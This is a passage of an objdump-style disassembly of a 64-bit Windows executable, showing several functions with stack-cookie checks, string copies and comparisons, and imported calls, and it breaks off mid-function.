   140001e8b:	5b                   	pop    %rbx
   140001e8c:	c3                   	ret
   140001e8d:	cc                   	int3
   140001e8e:	cc                   	int3
   140001e8f:	cc                   	int3
   140001e90:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140001e95:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140001e9a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140001e9f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140001ea4:	53                   	push   %rbx
   140001ea5:	57                   	push   %rdi
   140001ea6:	b8 48 14 00 00       	mov    $0x1448,%eax
   140001eab:	e8 a0 6d 00 00       	call   0x140008c50
   140001eb0:	48 2b e0             	sub    %rax,%rsp
   140001eb3:	48 8b 05 56 01 03 00 	mov    0x30156(%rip),%rax        # 0x140032010
   140001eba:	48 33 c4             	xor    %rsp,%rax
   140001ebd:	48 89 84 24 30 14 00 	mov    %rax,0x1430(%rsp)
   140001ec4:	00 
   140001ec5:	48 8b d9             	mov    %rcx,%rbx
   140001ec8:	48 8d bc 24 68 14 00 	lea    0x1468(%rsp),%rdi
   140001ecf:	00 
   140001ed0:	e8 7b fa ff ff       	call   0x140001950
   140001ed5:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   140001eda:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140001edf:	4c 8b cb             	mov    %rbx,%r9
   140001ee2:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001ee9:	00 00 
   140001eeb:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140001ef1:	48 8b 08             	mov    (%rax),%rcx
   140001ef4:	48 83 c9 01          	or     $0x1,%rcx
   140001ef8:	e8 27 c1 00 00       	call   0x14000e024
   140001efd:	33 d2                	xor    %edx,%edx
   140001eff:	48 8d 8c 24 30 04 00 	lea    0x430(%rsp),%rcx
   140001f06:	00 
   140001f07:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   140001f0d:	e8 0e 7b 00 00       	call   0x140009a20
   140001f12:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140001f18:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140001f1d:	48 8d 8c 24 30 0c 00 	lea    0xc30(%rsp),%rcx
   140001f24:	00 
   140001f25:	e8 86 3b 00 00       	call   0x140005ab0
   140001f2a:	48 85 c0             	test   %rax,%rax
   140001f2d:	74 3a                	je     0x140001f69
   140001f2f:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140001f35:	48 8d 15 9c 06 02 00 	lea    0x2069c(%rip),%rdx        # 0x1400225d8
   140001f3c:	48 8d 8c 24 30 04 00 	lea    0x430(%rsp),%rcx
   140001f43:	00 
   140001f44:	e8 67 3b 00 00       	call   0x140005ab0
   140001f49:	41 b9 30 00 00 00    	mov    $0x30,%r9d
   140001f4f:	4c 8d 84 24 30 04 00 	lea    0x430(%rsp),%r8
   140001f56:	00 
   140001f57:	48 8d 94 24 30 0c 00 	lea    0xc30(%rsp),%rdx
   140001f5e:	00 
   140001f5f:	33 c9                	xor    %ecx,%ecx
   140001f61:	ff 15 a9 03 02 00    	call   *0x203a9(%rip)        # 0x140022310
   140001f67:	eb 1a                	jmp    0x140001f83
   140001f69:	41 b9 30 00 00 00    	mov    $0x30,%r9d
   140001f6f:	4c 8d 05 62 06 02 00 	lea    0x20662(%rip),%r8        # 0x1400225d8
   140001f76:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140001f7b:	33 c9                	xor    %ecx,%ecx
   140001f7d:	ff 15 95 03 02 00    	call   *0x20395(%rip)        # 0x140022318
   140001f83:	48 8b 8c 24 30 14 00 	mov    0x1430(%rsp),%rcx
   140001f8a:	00 
   140001f8b:	48 33 cc             	xor    %rsp,%rcx
   140001f8e:	e8 7d 6c 00 00       	call   0x140008c10
   140001f93:	48 81 c4 48 14 00 00 	add    $0x1448,%rsp
   140001f9a:	5f                   	pop    %rdi
   140001f9b:	5b                   	pop    %rbx
   140001f9c:	c3                   	ret
   140001f9d:	cc                   	int3
   140001f9e:	cc                   	int3
   140001f9f:	cc                   	int3
   140001fa0:	40 55                	rex push %rbp
   140001fa2:	53                   	push   %rbx
   140001fa3:	56                   	push   %rsi
   140001fa4:	48 8d ac 24 90 a0 ff 	lea    -0x5f70(%rsp),%rbp
   140001fab:	ff 
   140001fac:	b8 70 60 00 00       	mov    $0x6070,%eax
   140001fb1:	e8 9a 6c 00 00       	call   0x140008c50
   140001fb6:	48 2b e0             	sub    %rax,%rsp
   140001fb9:	48 8b 05 50 00 03 00 	mov    0x30050(%rip),%rax        # 0x140032010
   140001fc0:	48 33 c4             	xor    %rsp,%rax
   140001fc3:	48 89 85 60 5f 00 00 	mov    %rax,0x5f60(%rbp)
   140001fca:	48 8b 19             	mov    (%rcx),%rbx
   140001fcd:	48 8b f1             	mov    %rcx,%rsi
   140001fd0:	48 8d 8d 50 4f 00 00 	lea    0x4f50(%rbp),%rcx
   140001fd7:	41 b8 01 10 00 00    	mov    $0x1001,%r8d
   140001fdd:	e8 3e c6 00 00       	call   0x14000e620
   140001fe2:	80 bd 50 5f 00 00 00 	cmpb   $0x0,0x5f50(%rbp)
   140001fe9:	0f 85 d3 02 00 00    	jne    0x1400022c2
   140001fef:	48 8d 15 f6 05 02 00 	lea    0x205f6(%rip),%rdx        # 0x1400225ec
   140001ff6:	48 8d 8d 50 4f 00 00 	lea    0x4f50(%rbp),%rcx
   140001ffd:	e8 8a c7 00 00       	call   0x14000e78c
   140002002:	4c 8d 85 50 0f 00 00 	lea    0xf50(%rbp),%r8
   140002009:	4c 2b c0             	sub    %rax,%r8
   14000200c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002010:	0f b6 08             	movzbl (%rax),%ecx
   140002013:	41 88 0c 00          	mov    %cl,(%r8,%rax,1)
   140002017:	48 8d 40 01          	lea    0x1(%rax),%rax
   14000201b:	84 c9                	test   %cl,%cl
   14000201d:	75 f1                	jne    0x140002010
   14000201f:	48 8d 15 c6 05 02 00 	lea    0x205c6(%rip),%rdx        # 0x1400225ec
   140002026:	33 c9                	xor    %ecx,%ecx
   140002028:	e8 5f c7 00 00       	call   0x14000e78c
   14000202d:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140002032:	48 2b d0             	sub    %rax,%rdx
   140002035:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000203c:	00 00 00 00 
   140002040:	0f b6 08             	movzbl (%rax),%ecx
   140002043:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
   140002046:	48 8d 40 01          	lea    0x1(%rax),%rax
   14000204a:	84 c9                	test   %cl,%cl
   14000204c:	75 f2                	jne    0x140002040
   14000204e:	38 8d 50 0f 00 00    	cmp    %cl,0xf50(%rbp)
   140002054:	0f 84 68 02 00 00    	je     0x1400022c2
   14000205a:	38 4c 24 50          	cmp    %cl,0x50(%rsp)
   14000205e:	0f 84 5e 02 00 00    	je     0x1400022c2
   140002064:	48 89 bc 24 a0 60 00 	mov    %rdi,0x60a0(%rsp)
   14000206b:	00 
   14000206c:	48 8d 95 50 0f 00 00 	lea    0xf50(%rbp),%rdx
   140002073:	48 8d 8d 50 3f 00 00 	lea    0x3f50(%rbp),%rcx
   14000207a:	4c 89 b4 24 a8 60 00 	mov    %r14,0x60a8(%rsp)
   140002081:	00 
   140002082:	e8 b9 0b 00 00       	call   0x140002c40
   140002087:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   14000208c:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140002091:	4c 8d 35 bc 05 02 00 	lea    0x205bc(%rip),%r14        # 0x140022654
   140002098:	48 8d 85 50 3f 00 00 	lea    0x3f50(%rbp),%rax
   14000209f:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   1400020a4:	4d 8b ce             	mov    %r14,%r9
   1400020a7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400020ac:	4c 8d 83 78 10 00 00 	lea    0x1078(%rbx),%r8
   1400020b3:	48 8d 15 9e 05 02 00 	lea    0x2059e(%rip),%rdx        # 0x140022658
   1400020ba:	48 8d 8d 50 2f 00 00 	lea    0x2f50(%rbp),%rcx
   1400020c1:	e8 aa 03 00 00       	call   0x140002470
   1400020c6:	85 c0                	test   %eax,%eax
   1400020c8:	75 6c                	jne    0x140002136
   1400020ca:	48 8b cb             	mov    %rbx,%rcx
   1400020cd:	e8 ee 25 00 00       	call   0x1400046c0
   1400020d2:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400020d5:	74 21                	je     0x1400020f8
   1400020d7:	48 8d 93 78 20 00 00 	lea    0x2078(%rbx),%rdx
   1400020de:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   1400020e3:	48 8d 8d 50 2f 00 00 	lea    0x2f50(%rbp),%rcx
   1400020ea:	e8 b1 24 00 00       	call   0x1400045a0
   1400020ef:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400020f2:	0f 85 a5 01 00 00    	jne    0x14000229d
   1400020f8:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400020fd:	48 8d 0d 64 05 02 00 	lea    0x20564(%rip),%rcx        # 0x140022668
   140002104:	e8 77 fc ff ff       	call   0x140001d80
   140002109:	83 c8 ff             	or     $0xffffffff,%eax
   14000210c:	48 8b bc 24 a0 60 00 	mov    0x60a0(%rsp),%rdi
   140002113:	00 
   140002114:	4c 8b b4 24 a8 60 00 	mov    0x60a8(%rsp),%r14
   14000211b:	00 
   14000211c:	48 8b 8d 60 5f 00 00 	mov    0x5f60(%rbp),%rcx
   140002123:	48 33 cc             	xor    %rsp,%rcx
   140002126:	e8 e5 6a 00 00       	call   0x140008c10
   14000212b:	48 81 c4 70 60 00 00 	add    $0x6070,%rsp
   140002132:	5e                   	pop    %rsi
   140002133:	5b                   	pop    %rbx
   140002134:	5d                   	pop    %rbp
   140002135:	c3                   	ret
   140002136:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   14000213b:	4d 8b ce             	mov    %r14,%r9
   14000213e:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002143:	4c 8d 83 78 10 00 00 	lea    0x1078(%rbx),%r8
   14000214a:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   14000214f:	48 8d 85 50 3f 00 00 	lea    0x3f50(%rbp),%rax
   140002156:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000215b:	48 8d 15 1e 05 02 00 	lea    0x2051e(%rip),%rdx        # 0x140022680
   140002162:	48 8d 05 13 05 02 00 	lea    0x20513(%rip),%rax        # 0x14002267c
   140002169:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   14000216e:	48 8d 8d 50 2f 00 00 	lea    0x2f50(%rbp),%rcx
   140002175:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000217a:	e8 f1 02 00 00       	call   0x140002470
   14000217f:	85 c0                	test   %eax,%eax
   140002181:	0f 84 43 ff ff ff    	je     0x1400020ca
   140002187:	48 8d 85 50 0f 00 00 	lea    0xf50(%rbp),%rax
   14000218e:	4d 8b ce             	mov    %r14,%r9
   140002191:	4c 8d 83 78 10 00 00 	lea    0x1078(%rbx),%r8
   140002198:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000219d:	48 8d 15 ec 04 02 00 	lea    0x204ec(%rip),%rdx        # 0x140022690
   1400021a4:	48 8d 8d 50 1f 00 00 	lea    0x1f50(%rbp),%rcx
   1400021ab:	e8 c0 02 00 00       	call   0x140002470
   1400021b0:	85 c0                	test   %eax,%eax
   1400021b2:	74 5a                	je     0x14000220e
   1400021b4:	48 8d 85 50 0f 00 00 	lea    0xf50(%rbp),%rax
   1400021bb:	4d 8b ce             	mov    %r14,%r9
   1400021be:	4c 8d 83 78 10 00 00 	lea    0x1078(%rbx),%r8
   1400021c5:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400021ca:	48 8d 15 cf 04 02 00 	lea    0x204cf(%rip),%rdx        # 0x1400226a0
   1400021d1:	48 8d 8d 50 1f 00 00 	lea    0x1f50(%rbp),%rcx
   1400021d8:	e8 93 02 00 00       	call   0x140002470
   1400021dd:	85 c0                	test   %eax,%eax
   1400021df:	74 2d                	je     0x14000220e
   1400021e1:	48 8d 85 50 0f 00 00 	lea    0xf50(%rbp),%rax
   1400021e8:	4d 8b ce             	mov    %r14,%r9
   1400021eb:	4c 8d 83 78 10 00 00 	lea    0x1078(%rbx),%r8
   1400021f2:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400021f7:	48 8d 15 ae 04 02 00 	lea    0x204ae(%rip),%rdx        # 0x1400226ac
   1400021fe:	48 8d 8d 50 1f 00 00 	lea    0x1f50(%rbp),%rcx
   140002205:	e8 66 02 00 00       	call   0x140002470
   14000220a:	85 c0                	test   %eax,%eax
   14000220c:	75 17                	jne    0x140002225
   14000220e:	48 8d 95 50 1f 00 00 	lea    0x1f50(%rbp),%rdx
   140002215:	48 8b ce             	mov    %rsi,%rcx
   140002218:	e8 b3 00 00 00       	call   0x1400022d0
   14000221d:	48 8b f8             	mov    %rax,%rdi
   140002220:	48 85 c0             	test   %rax,%rax
   140002223:	75 13                	jne    0x140002238
   140002225:	48 8d 95 50 1f 00 00 	lea    0x1f50(%rbp),%rdx
   14000222c:	48 8d 0d 85 04 02 00 	lea    0x20485(%rip),%rcx        # 0x1400226b8
   140002233:	e9 cc fe ff ff       	jmp    0x140002104
   140002238:	48 8b 58 10          	mov    0x10(%rax),%rbx
   14000223c:	48 3b 58 18          	cmp    0x18(%rax),%rbx
   140002240:	73 5b                	jae    0x14000229d
   140002242:	0f 1f 40 00          	nopl   0x0(%rax)
   140002246:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000224d:	00 00 00 
   140002250:	48 8d 43 12          	lea    0x12(%rbx),%rax
   140002254:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   140002259:	4c 2b c8             	sub    %rax,%r9
   14000225c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002260:	44 0f b6 00          	movzbl (%rax),%r8d
   140002264:	42 0f b6 0c 08       	movzbl (%rax,%r9,1),%ecx
   140002269:	44 2b c1             	sub    %ecx,%r8d
   14000226c:	75 07                	jne    0x140002275
   14000226e:	48 ff c0             	inc    %rax
   140002271:	85 c9                	test   %ecx,%ecx
   140002273:	75 eb                	jne    0x140002260
   140002275:	45 85 c0             	test   %r8d,%r8d
   140002278:	75 0f                	jne    0x140002289
   14000227a:	48 8b d3             	mov    %rbx,%rdx
   14000227d:	48 8b cf             	mov    %rdi,%rcx
   140002280:	e8 0b f1 ff ff       	call   0x140001390
   140002285:	85 c0                	test   %eax,%eax
   140002287:	75 1b                	jne    0x1400022a4
   140002289:	48 8b d3             	mov    %rbx,%rdx
   14000228c:	48 8b cf             	mov    %rdi,%rcx
   14000228f:	e8 9c f3 ff ff       	call   0x140001630
   140002294:	48 8b d8             	mov    %rax,%rbx
   140002297:	48 3b 47 18          	cmp    0x18(%rdi),%rax
   14000229b:	72 b3                	jb     0x140002250
   14000229d:	33 c0                	xor    %eax,%eax
   14000229f:	e9 68 fe ff ff       	jmp    0x14000210c
   1400022a4:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400022a9:	48 8d 0d 20 04 02 00 	lea    0x20420(%rip),%rcx        # 0x1400226d0
   1400022b0:	e8 cb fa ff ff       	call   0x140001d80
   1400022b5:	48 8b cf             	mov    %rdi,%rcx
   1400022b8:	e8 0f 8b 00 00       	call   0x14000adcc
   1400022bd:	e9 47 fe ff ff       	jmp    0x140002109
   1400022c2:	83 c8 ff             	or     $0xffffffff,%eax
   1400022c5:	e9 52 fe ff ff       	jmp    0x14000211c
   1400022ca:	cc                   	int3
   1400022cb:	cc                   	int3
   1400022cc:	cc                   	int3
   1400022cd:	cc                   	int3
   1400022ce:	cc                   	int3
   1400022cf:	cc                   	int3
   1400022d0:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1400022d5:	56                   	push   %rsi
   1400022d6:	48 83 ec 20          	sub    $0x20,%rsp
   1400022da:	48 8b f1             	mov    %rcx,%rsi
   1400022dd:	48 8b ea             	mov    %rdx,%rbp
   1400022e0:	48 8b 09             	mov    (%rcx),%rcx
   1400022e3:	e8 d8 23 00 00       	call   0x1400046c0
   1400022e8:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400022eb:	75 0d                	jne    0x1400022fa
   1400022ed:	33 c0                	xor    %eax,%eax
   1400022ef:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   1400022f4:	48 83 c4 20          	add    $0x20,%rsp
   1400022f8:	5e                   	pop    %rsi
   1400022f9:	c3                   	ret
   1400022fa:	48 83 7e 08 00       	cmpq   $0x0,0x8(%rsi)
   1400022ff:	48 8d 46 08          	lea    0x8(%rsi),%rax
   140002303:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   140002308:	bf 01 00 00 00       	mov    $0x1,%edi
   14000230d:	74 48                	je     0x140002357
   14000230f:	44 8b cf             	mov    %edi,%r9d
   140002312:	0f 1f 40 00          	nopl   0x0(%rax)
   140002316:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000231d:	00 00 00 
   140002320:	4c 8b 10             	mov    (%rax),%r10
   140002323:	4c 8b c5             	mov    %rbp,%r8
   140002326:	49 8d 42 78          	lea    0x78(%r10),%rax
   14000232a:	4c 2b c0             	sub    %rax,%r8
   14000232d:	0f 1f 00             	nopl   (%rax)
   140002330:	0f b6 10             	movzbl (%rax),%edx
   140002333:	42 0f b6 0c 00       	movzbl (%rax,%r8,1),%ecx
   140002338:	2b d1                	sub    %ecx,%edx
   14000233a:	75 07                	jne    0x140002343
   14000233c:	48 ff c0             	inc    %rax
   14000233f:	85 c9                	test   %ecx,%ecx
   140002341:	75 ed                	jne    0x140002330
   140002343:	85 d2                	test   %edx,%edx
   140002345:	74 3f                	je     0x140002386
   140002347:	49 ff c1             	inc    %r9
   14000234a:	ff c7                	inc    %edi
   14000234c:	4a 83 3c ce 00       	cmpq   $0x0,(%rsi,%r9,8)
   140002351:	4a 8d 04 ce          	lea    (%rsi,%r9,8),%rax
   140002355:	75 c9                	jne    0x140002320
   140002357:	b9 90 40 00 00       	mov    $0x4090,%ecx
   14000235c:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140002361:	e8 6e 8a 00 00       	call   0x14000add4
   140002366:	48 8b d8             	mov    %rax,%rbx
   140002369:	48 85 c0             	test   %rax,%rax
   14000236c:	75 2b                	jne    0x140002399
   14000236e:	48 8d 15 7b 02 02 00 	lea    0x2027b(%rip),%rdx        # 0x1400225f0
   140002375:	48 8d 0d 00 02 02 00 	lea    0x20200(%rip),%rcx        # 0x14002257c
   14000237c:	e8 df f5 ff ff       	call   0x140001960
   140002381:	e9 cb 00 00 00       	jmp    0x140002451
   140002386:	49 8b c2             	mov    %r10,%rax
   140002389:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   14000238e:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   140002393:	48 83 c4 20          	add    $0x20,%rsp
   140002397:	5e                   	pop    %rsi
   140002398:	c3                   	ret
   140002399:	48 8d 48 78          	lea    0x78(%rax),%rcx
   14000239d:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400023a3:	48 8b d5             	mov    %rbp,%rdx
   1400023a6:	e8 75 c2 00 00       	call   0x14000e620
   1400023ab:	48 8b 16             	mov    (%rsi),%rdx
   1400023ae:	48 8d 8b 78 10 00 00 	lea    0x1078(%rbx),%rcx
   1400023b5:	48 81 c2 78 10 00 00 	add    $0x1078,%rdx
   1400023bc:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400023c2:	e8 59 c2 00 00       	call   0x14000e620
   1400023c7:	48 8b 16             	mov    (%rsi),%rdx
   1400023ca:	48 8d 8b 78 20 00 00 	lea    0x2078(%rbx),%rcx
   1400023d1:	48 81 c2 78 20 00 00 	add    $0x2078,%rdx
   1400023d8:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400023de:	e8 3d c2 00 00       	call   0x14000e620
   1400023e3:	80 bb 77 10 00 00 00 	cmpb   $0x0,0x1077(%rbx)
   1400023ea:	75 51                	jne    0x14000243d
   1400023ec:	80 bb 77 20 00 00 00 	cmpb   $0x0,0x2077(%rbx)
   1400023f3:	75 48                	jne    0x14000243d
   1400023f5:	80 bb 77 30 00 00 00 	cmpb   $0x0,0x3077(%rbx)
   1400023fc:	75 3f                	jne    0x14000243d
   1400023fe:	48 8b 06             	mov    (%rsi),%rax
   140002401:	8b 88 78 40 00 00    	mov    0x4078(%rax),%ecx
   140002407:	89 8b 78 40 00 00    	mov    %ecx,0x4078(%rbx)
   14000240d:	48 8b cb             	mov    %rbx,%rcx
   140002410:	e8 5b f2 ff ff       	call   0x140001670
   140002415:	85 c0                	test   %eax,%eax
   140002417:	74 18                	je     0x140002431
   140002419:	4c 8b c5             	mov    %rbp,%r8
   14000241c:	48 8d 15 15 02 02 00 	lea    0x20215(%rip),%rdx        # 0x140022638
   140002423:	48 8d 0d 52 01 02 00 	lea    0x20152(%rip),%rcx        # 0x14002257c
   14000242a:	e8 31 f5 ff ff       	call   0x140001960
   14000242f:	eb 18                	jmp    0x140002449
   140002431:	48 63 c7             	movslq %edi,%rax
   140002434:	48 89 1c c6          	mov    %rbx,(%rsi,%rax,8)
   140002438:	48 8b c3             	mov    %rbx,%rax
   14000243b:	eb 16                	jmp    0x140002453
   14000243d:	48 8d 0d d4 01 02 00 	lea    0x201d4(%rip),%rcx        # 0x140022618
   140002444:	e8 37 f9 ff ff       	call   0x140001d80
   140002449:	48 8b cb             	mov    %rbx,%rcx
   14000244c:	e8 7b 89 00 00       	call   0x14000adcc
   140002451:	33 c0                	xor    %eax,%eax
   140002453:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002458:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   14000245d:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   140002462:	48 83 c4 20          	add    $0x20,%rsp
   140002466:	5e                   	pop    %rsi
   140002467:	c3                   	ret
   140002468:	cc                   	int3
   140002469:	cc                   	int3
   14000246a:	cc                   	int3
   14000246b:	cc                   	int3
   14000246c:	cc                   	int3
   14000246d:	cc                   	int3
   14000246e:	cc                   	int3
   14000246f:	cc                   	int3
   140002470:	4c 8b dc             	mov    %rsp,%r11
   140002473:	49 89 53 10          	mov    %rdx,0x10(%r11)
   140002477:	4d 89 43 18          	mov    %r8,0x18(%r11)
   14000247b:	4d 89 4b 20          	mov    %r9,0x20(%r11)
   14000247f:	53                   	push   %rbx
   140002480:	56                   	push   %rsi
   140002481:	57                   	push   %rdi
   140002482:	48 83 ec 70          	sub    $0x70,%rsp
   140002486:	48 8b 05 83 fb 02 00 	mov    0x2fb83(%rip),%rax        # 0x140032010
   14000248d:	48 33 c4             	xor    %rsp,%rax
   140002490:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140002495:	48 8b da             	mov    %rdx,%rbx
   140002498:	49 8d 73 18          	lea    0x18(%r11),%rsi
   14000249c:	48 8b f9             	mov    %rcx,%rdi
   14000249f:	e8 ac f4 ff ff       	call   0x140001950
   1400024a4:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   1400024a9:	4c 8b cb             	mov    %rbx,%r9
   1400024ac:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400024b2:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400024b9:	00 00 
   1400024bb:	48 8b d7             	mov    %rdi,%rdx
   1400024be:	48 8b 08             	mov    (%rax),%rcx
   1400024c1:	48 83 c9 01          	or     $0x1,%rcx
   1400024c5:	e8 5a bb 00 00       	call   0x14000e024
   1400024ca:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400024cf:	48 8b cf             	mov    %rdi,%rcx
   1400024d2:	e8 8d ca 00 00       	call   0x14000ef64
   1400024d7:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   1400024dc:	48 33 cc             	xor    %rsp,%rcx
   1400024df:	e8 2c 67 00 00       	call   0x140008c10
   1400024e4:	48 83 c4 70          	add    $0x70,%rsp
   1400024e8:	5f                   	pop    %rdi
   1400024e9:	5e                   	pop    %rsi
   1400024ea:	5b                   	pop    %rbx
   1400024eb:	c3                   	ret
   1400024ec:	cc                   	int3
   1400024ed:	cc                   	int3
   1400024ee:	cc                   	int3
   1400024ef:	cc                   	int3
   1400024f0:	40 53                	rex push %rbx
   1400024f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400024f6:	48 8b d9             	mov    %rcx,%rbx
   1400024f9:	e8 c2 19 00 00       	call   0x140003ec0
   1400024fe:	85 c0                	test   %eax,%eax
   140002500:	74 09                	je     0x14000250b
   140002502:	83 c8 ff             	or     $0xffffffff,%eax
   140002505:	48 83 c4 20          	add    $0x20,%rsp
   140002509:	5b                   	pop    %rbx
   14000250a:	c3                   	ret
   14000250b:	48 8b cb             	mov    %rbx,%rcx
   14000250e:	c7 83 7c 40 00 00 01 	movl   $0x1,0x407c(%rbx)
   140002515:	00 00 00 
   140002518:	e8 d3 1d 00 00       	call   0x1400042f0
   14000251d:	85 c0                	test   %eax,%eax
   14000251f:	75 e1                	jne    0x140002502
   140002521:	48 8b cb             	mov    %rbx,%rcx
   140002524:	e8 27 16 00 00       	call   0x140003b50
   140002529:	85 c0                	test   %eax,%eax
   14000252b:	75 d5                	jne    0x140002502
   14000252d:	48 8b cb             	mov    %rbx,%rcx
   140002530:	e8 1b 18 00 00       	call   0x140003d50
   140002535:	85 c0                	test   %eax,%eax
   140002537:	75 c9                	jne    0x140002502
   140002539:	48 8b cb             	mov    %rbx,%rcx
   14000253c:	48 83 c4 20          	add    $0x20,%rsp
   140002540:	5b                   	pop    %rbx
   140002541:	e9 ca 01 00 00       	jmp    0x140002710
   140002546:	cc                   	int3
   140002547:	cc                   	int3
   140002548:	cc                   	int3
   140002549:	cc                   	int3
   14000254a:	cc                   	int3
   14000254b:	cc                   	int3
   14000254c:	cc                   	int3
   14000254d:	cc                   	int3
   14000254e:	cc                   	int3
   14000254f:	cc                   	int3
   140002550:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140002555:	56                   	push   %rsi
   140002556:	48 81 ec d0 00 00 00 	sub    $0xd0,%rsp
   14000255d:	48 8b 05 ac fa 02 00 	mov    0x2faac(%rip),%rax        # 0x140032010
   140002564:	48 33 c4             	xor    %rsp,%rax
   140002567:	48 89 84 24 c0 00 00 	mov    %rax,0xc0(%rsp)
   14000256e:	00 
   14000256f:	48 8b 59 10          	mov    0x10(%rcx),%rbx
   140002573:	33 d2                	xor    %edx,%edx
   140002575:	48 89 bc 24 f0 00 00 	mov    %rdi,0xf0(%rsp)
   14000257c:	00 
   14000257d:	41 b8 a0 00 00 00    	mov    $0xa0,%r8d
   140002583:	48 8b f9             	mov    %rcx,%rdi
   140002586:	33 f6                	xor    %esi,%esi
   140002588:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000258d:	e8 8e 74 00 00       	call   0x140009a20
   140002592:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140002597:	48 3b 5f 18          	cmp    0x18(%rdi),%rbx
   14000259b:	73 3d                	jae    0x1400025da
   14000259d:	48 89 ac 24 e8 00 00 	mov    %rbp,0xe8(%rsp)
   1400025a4:	00 
   1400025a5:	bd 01 01 00 40       	mov    $0x40000101,%ebp
   1400025aa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400025b0:	0f b6 4b 11          	movzbl 0x11(%rbx),%ecx
   1400025b4:	8d 41 a6             	lea    -0x5a(%rcx),%eax
   1400025b7:	3c 1e                	cmp    $0x1e,%al
   1400025b9:	77 6c                	ja     0x140002627
   1400025bb:	0f a3 c5             	bt     %eax,%ebp
   1400025be:	73 67                	jae    0x140002627
   1400025c0:	48 8b d3             	mov    %rbx,%rdx
   1400025c3:	48 8b cf             	mov    %rdi,%rcx
   1400025c6:	e8 c5 ed ff ff       	call   0x140001390
   1400025cb:	85 c0                	test   %eax,%eax
   1400025cd:	74 70                	je     0x14000263f
   1400025cf:	83 ce ff             	or     $0xffffffff,%esi
   1400025d2:	48 8b ac 24 e8 00 00 	mov    0xe8(%rsp),%rbp
   1400025d9:	00 
   1400025da:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400025df:	bb 01 00 00 00       	mov    $0x1,%ebx
   1400025e4:	48 8b bc 24 f0 00 00 	mov    0xf0(%rsp),%rdi
   1400025eb:	00 
   1400025ec:	48 85 c9             	test   %rcx,%rcx
   1400025ef:	74 13                	je     0x140002604
   1400025f1:	e8 1a f3 ff ff       	call   0x140001910
   1400025f6:	48 8d 5b 01          	lea    0x1(%rbx),%rbx
   1400025fa:	48 8b 4c dc 20       	mov    0x20(%rsp,%rbx,8),%rcx
   1400025ff:	48 85 c9             	test   %rcx,%rcx
   140002602:	75 ed                	jne    0x1400025f1
   140002604:	8b c6                	mov    %esi,%eax
   140002606:	48 8b 8c 24 c0 00 00 	mov    0xc0(%rsp),%rcx
   14000260d:	00 
   14000260e:	48 33 cc             	xor    %rsp,%rcx
   140002611:	e8 fa 65 00 00       	call   0x140008c10
   140002616:	48 8b 9c 24 f8 00 00 	mov    0xf8(%rsp),%rbx
   14000261d:	00 
   14000261e:	48 81 c4 d0 00 00 00 	add    $0xd0,%rsp
   140002625:	5e                   	pop    %rsi
   140002626:	c3                   	ret
   140002627:	80 f9 64             	cmp    $0x64,%cl
   14000262a:	75 13                	jne    0x14000263f
   14000262c:	48 8d 53 12          	lea    0x12(%rbx),%rdx
